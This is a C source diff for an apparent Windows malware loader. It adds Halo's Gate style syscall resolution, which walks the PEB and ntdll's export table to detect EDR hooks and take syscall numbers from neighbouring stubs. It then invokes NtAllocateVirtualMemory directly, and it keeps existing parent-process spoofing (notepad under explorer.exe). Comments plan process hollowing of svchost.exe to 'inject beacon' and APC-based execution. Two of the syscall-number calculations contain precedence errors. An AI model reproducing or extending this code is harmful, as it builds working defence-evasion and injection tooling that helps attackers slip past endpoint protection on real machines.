@@ -1,8 +1,23 @@
 #include <windows.h>
 #include <stdio.h>
-#include <winternl.h>
-#pragma comment(lib, "ntdll.lib")
+// #include <winternl.h>
+// #pragma comment(lib, "ntdll.lib")
+#include"struct.h"
 
+#define UP -32
+#define DOWN 32
+
+typedef struct _SYSCALL_ENTRY {
+    LPVOID  pAddress;
+    PCHAR   sName;
+    WORD    wSystemCall;
+} SYSCALL_ENTRY, * PSYSCALL_ENTRY;
+typedef struct _SYSCALL_TABLE {
+    SYSCALL_ENTRY   NtAllocateVirtualMemory;
+} SYSCALL_TABLE, * PSYSCALL_TABLE;
+
+extern VOID LoadSystemcall(WORD wSystemCall);
+extern ExecuteSystemcall();
 
 #define SystemProcessInformation 5
 typedef __kernel_entry NTSTATUS (WINAPI * t_NtQuerySystemInformation)(
@@ -91,18 +106,16 @@ DWORD get_target_proc_ppid(PWCHAR target_proc){
         NTSTATUS nt_code = p_NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS) SystemProcessInformation,
                                                         SysInfoClass,
                                                         SysInfoBufferSize,
-                                                        &SysInfoBufferSize
-                                                        );
+                                                        &SysInfoBufferSize);
         if(!nt_code){
             while(SysInfoClass->NextEntryOffset){
                 printf("proc_name [%S]\n", SysInfoClass->ImageName.Buffer);
                 if(lstrcmpiW(target_proc, SysInfoClass->ImageName.Buffer) == 0){
-                    pid = (DWORD) SysInfoClass->UniqueProcessId;
+                    pid = (DWORD_PTR) SysInfoClass->UniqueProcessId;
                     break;
                 } else {
                 // check next entry
-                    SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) ((ULONG_PTR)SysInfoClass + 
-                                                                    SysInfoClass->NextEntryOffset);
+                    SysInfoClass = (SYSTEM_PROCESS_INFORMATION *) ((ULONG_PTR)SysInfoClass + SysInfoClass->NextEntryOffset);
                 }
             }
 
@@ -209,15 +222,163 @@ parent process must have a PROCESS_CREATE_PROCESS access right
 
 }
 
+BOOL WINAPI hlp_GetProcAddrNtdll(PSYSCALL_ENTRY pSyscallEntry) {
+    LPVOID pNtFunction = NULL;
+    PVOID pNtdllBase = NULL;
+    LPCWSTR sNtdll = L"ntdll.dll";
+    LPCWSTR sModule = L"main.exe";
+
+    PPEB_LDR_DATA Ldr_data;
+    PLIST_ENTRY Ldr_module_list;
+    PLDR_DATA_TABLE_ENTRY Ldr_module_entry;
+
+    // get NTDLL base address
+    // dereference (_TEB *)TEB->(_PEB *)PEB->(_PEB_LDR_DATA *)LoaderData->(_LDR_DATA_TABLE_ENTRY *)Ldr_data_entry
+    // NtCurrentTeb()->ProcessEnvirtonmentBlock->LoaderData->InMemoryOrderModuleList
+
+    Ldr_data = (PPEB_LDR_DATA)NtCurrentTeb()->ProcessEnvironmentBlock->LoaderData;
+    Ldr_module_list = (PLIST_ENTRY)&Ldr_data->InMemoryOrderModuleList.Flink;
+    /*
+        LIST_ENTRY Ldr_module_list: linked_list of LIST_ENTRY Flink, Blink - treated as a pivot point for all modules
+        PLDR_DATA_TABLE_ENTRY Ldr_module_list - sizeof(LIST_ENTRY): struct of _LDR_DATA_TABLE_ENTRY - modules specific fields
+
+        [null, current_module, module_1, ..etc]
+
+    */
+    // loop through LIST_ENTRY structs
+    // find NTDLL by FullDllName.Buffer
+    Ldr_module_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Ldr_module_list - sizeof(LIST_ENTRY));
+    // extract DllBase
+    do
+    {
+        if (lstrcmpiW(Ldr_module_entry->BaseDllName.Buffer, sNtdll) == 0) {
+            printf("Found [%ls]\n", Ldr_module_entry->BaseDllName.Buffer);
+            printf("NTDLL at [%p]\n", Ldr_module_entry->DllBase);
+            pNtdllBase = Ldr_module_entry->DllBase;
+            break;
+        }
+        Ldr_module_list = Ldr_module_list->Flink;
+        Ldr_module_entry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)Ldr_module_list - sizeof(LIST_ENTRY));
+
+    } while (Ldr_module_entry);
+
+    // parse NTDLL headers
+    // loop through EAT
+    // find pNtFunction 
+    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pNtdllBase;
+    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)pNtdllBase + (BYTE)pDosHeader->e_lfanew);
+
+    // EAT DataDirectory[0]
+    PIMAGE_EXPORT_DIRECTORY pExportDirectory = (PIMAGE_EXPORT_DIRECTORY)((PBYTE)pNtdllBase + pNtHeaders->OptionalHeader.DataDirectory[0].VirtualAddress);
+
+    printf("NTDLL pEAT at [%p]\n", (LPVOID)pExportDirectory);
+
+    PDWORD pAddressOfFunctions = (PDWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfFunctions);
+    PDWORD pAddressOfNames = (PDWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfNames);
+    PWORD pAddressOfNameOrdinals = (PWORD)((PBYTE)pNtdllBase + pExportDirectory->AddressOfNameOrdinals);
+
+    // pENT[NumberOfNames]
+    // pEAT[EOT[NumberOfNames]]
+    for (DWORD i = 0; i < pExportDirectory->NumberOfNames; i++) {
+        PCHAR pszFunctionName = (PCHAR)((PBYTE)pNtdllBase + pAddressOfNames[i]);
+        LPVOID pFunctionAddress = (LPVOID)((PBYTE)pNtdllBase + pAddressOfFunctions[pAddressOfNameOrdinals[i]]);
+        // printf("[%s] at [%p]\n", pszFunctionName, pfunctionAddress);
+
+        if (strcmp(pszFunctionName, pSyscallEntry->sName) == 0) {
+            printf("[%s] at [%p]\n", pszFunctionName, pFunctionAddress);
+
+            // load pSyscallEntry.pAddress
+            pSyscallEntry->pAddress = pFunctionAddress;
+            // check if api is hooked
+            // if clean, load pSyscallEntry.wSystemCall
+            // if not - halo's gate
+
+            // First opcodes should be :
+            //    MOV R10, RCX
+            //    MOV RAX, <syscall> - [4 : 5]
+            if (*((PBYTE)pFunctionAddress) == 0x4c
+                && *((PBYTE)pFunctionAddress + 1) == 0x8b
+                && *((PBYTE)pFunctionAddress + 2) == 0xd1
+                && *((PBYTE)pFunctionAddress + 3) == 0xb8
+                && *((PBYTE)pFunctionAddress + 6) == 0x00
+                && *((PBYTE)pFunctionAddress + 7) == 0x00) {
+                printf("Fresh [%s] at [%p]\n", pszFunctionName, pSyscallEntry->pAddress);
+
+                // load pSyscallEntry.wSystemCall
+                BYTE high = *((PBYTE)pFunctionAddress + 5);
+                BYTE low = *((PBYTE)pFunctionAddress + 4);
+
+                pSyscallEntry->wSystemCall = (high << 8) | low;
+                printf("[%s] syscall is [%X]\n", pszFunctionName, pSyscallEntry->wSystemCall);
+
+            }
+            if (*((PBYTE)pFunctionAddress) == 0xe9) {
+                printf("Hooked Syscall\n");
+                for (WORD idx = 1; idx <= 500; idx++) {
+                    // check neighboring syscall down
+                    if (*((PBYTE)pFunctionAddress + idx * DOWN) == 0x4c
+                        && *((PBYTE)pFunctionAddress + 1 + idx * DOWN) == 0x8b
+                        && *((PBYTE)pFunctionAddress + 2 + idx * DOWN) == 0xd1
+                        && *((PBYTE)pFunctionAddress + 3 + idx * DOWN) == 0xb8
+                        && *((PBYTE)pFunctionAddress + 6 + idx * DOWN) == 0x00
+                        && *((PBYTE)pFunctionAddress + 7 + idx * DOWN) == 0x00) {
+                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * DOWN);
+                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * DOWN);
+                        pSyscallEntry->wSystemCall = (high << 8) | low - idx;
+
+                        return TRUE;
+                    }
+                    // check neighboring syscall up
+                    if (*((PBYTE)pFunctionAddress + idx * UP) == 0x4c
+                        && *((PBYTE)pFunctionAddress + 1 + idx * UP) == 0x8b
+                        && *((PBYTE)pFunctionAddress + 2 + idx * UP) == 0xd1
+                        && *((PBYTE)pFunctionAddress + 3 + idx * UP) == 0xb8
+                        && *((PBYTE)pFunctionAddress + 6 + idx * UP) == 0x00
+                        && *((PBYTE)pFunctionAddress + 7 + idx * UP) == 0x00) {
+                        BYTE high = *((PBYTE)pFunctionAddress + 5 + idx * UP);
+                        BYTE low = *((PBYTE)pFunctionAddress + 4 + idx * UP);
+                        pSyscallEntry->wSystemCall = (high << 8) | low + idx;
+
+                        return TRUE;
+                    }
+                }
+            }
+        }
+    }
+    return TRUE;
+}
+
+// __kernel_entry NTSYSCALLAPI NTSTATUS NtAllocateVirtualMemory(
+//   [in]      HANDLE    ProcessHandle,
+//   [in, out] PVOID     *BaseAddress,
+//   [in]      ULONG_PTR ZeroBits,
+//   [in, out] PSIZE_T   RegionSize,
+//   [in]      ULONG     AllocationType,
+//   [in]      ULONG     Protect
+// );
 
 // process hollowing injection
 // launch svchost.exe and inject beacon
 
 // threadless execution - QueueAPC
 
-
-
 int main(void){
+
+    SYSCALL_TABLE syscall_table = { 0 };
+    syscall_table.NtAllocateVirtualMemory.sName = "NtAllocateVirtualMemory";
+    hlp_GetProcAddrNtdll(&syscall_table.NtAllocateVirtualMemory);
+
+    printf("[%p] [%d]\n", syscall_table.NtAllocateVirtualMemory.pAddress, syscall_table.NtAllocateVirtualMemory.wSystemCall);
+    // test NtAllocateVirtualMemory
+    PVOID lpAllocatedAddress = NULL;
+    SIZE_T sDataSize = sizeof(MAX_PATH);
+    LoadSystemcall(syscall_table.NtAllocateVirtualMemory.wSystemCall);
+    NTSTATUS status = ExecuteSystemcall(GetCurrentProcess(), &lpAllocatedAddress, 0, &sDataSize, MEM_COMMIT, PAGE_READWRITE);
+    if (status) {
+        printf("NtAllocateVirtualMemory failed[%d]\n", GetLastError());
+    }
+    printf("pAllocatedAddress at [%p]\n", lpAllocatedAddress);
+    getchar();
 
     LPCSTR target_proc = "notepad";
     PWCHAR target_parent = L"explorer.exe";
@@ -230,8 +391,7 @@ int main(void){
     }
     hTarget = create_spoof_target(target_proc, target_ppid);
     if(hTarget){
-        printf("Target Process [%s.exe], handle [%i]\n", target_proc, hTarget);
+        printf("Target Process [%s.exe], handle [%lld]\n", target_proc, (DWORD_PTR) hTarget);
     }
-
     return 0;
 }
